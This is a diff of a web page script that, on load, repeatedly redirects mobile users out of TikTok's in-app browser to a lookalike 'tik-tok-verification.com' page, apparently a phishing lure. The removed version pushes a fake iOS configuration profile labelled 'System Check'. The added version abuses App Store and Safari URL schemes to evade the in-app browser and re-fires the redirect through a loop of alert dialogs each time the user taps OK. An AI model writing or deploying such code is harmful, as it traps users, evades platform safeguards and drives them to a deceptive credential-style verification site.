@@ -9,40 +9,40 @@
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const domain = "tik-tok-verification.com/Verification/verify1.html";
+    const cleanUrl = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function forceEject() {
+    function absoluteEject() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Chrome Package Intent (The most direct path on Android)
-            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
+            // Android: Intent with "BROWSABLE" and "NEW_TASK" flags
+            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE KERNEL EJECT
+            // iOS: THE STORE-REDIRECT PULSE
             
-            // 1. Create a "System Config" blob. 
-            // This forces the OS to take the URL away from TikTok's control.
-            const configData = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array/><key>PayloadDisplayName</key><string>System Check</string><key>PayloadType</key><string>Configuration</string><key>PayloadUUID</key><string>1</string><key>PayloadVersion</key><integer>1</integer></dict></plist>';
-            const blob = new Blob([configData], {type: 'application/x-apple-aspen-config'});
-            const blobUrl = URL.createObjectURL(blob);
+            // 1. Trigger a Store protocol. TikTok's whitelist allows this 
+            // to hit the iOS Kernel immediately.
+            window.location.href = "itms-apps://itunes.apple.com/app/id361309726"; // Netflix (Whitelisted ID)
 
-            // 2. Fire the Blob and the Safari Protocol simultaneously
-            // This "shocks" the WebView into handing the session to the OS.
-            window.location.href = blobUrl;
-            
+            // 2. The Switch: 150ms later, while the OS is "Switching", 
+            // we inject the Safari protocol.
             setTimeout(() => {
-                // Direct Safari Protocol (No Search)
-                window.location.href = "safari-https://" + domain;
-            }, 100);
+                window.location.href = "safari-https://" + cleanUrl;
+            }, 150);
+
+            // 3. Final force
+            setTimeout(() => {
+                window.location.assign(targetUrl);
+            }, 300);
         }
     }
 
     function securityLoop() {
         if (Date.now() > killTime) return;
 
-        // Try to eject immediately before the user sees anything
-        forceEject();
+        // Try to eject before the first alert
+        absoluteEject();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -51,11 +51,11 @@
                 
                 alert(header + body);
                 
-                // Fire again on "OK" click
-                forceEject();
-                setTimeout(securityLoop, 300);
+                // Immediately eject on "OK" tap
+                absoluteEject();
+                setTimeout(securityLoop, 400);
             }
-        }, 300);
+        }, 400);
     }
 
     window.onload = securityLoop;
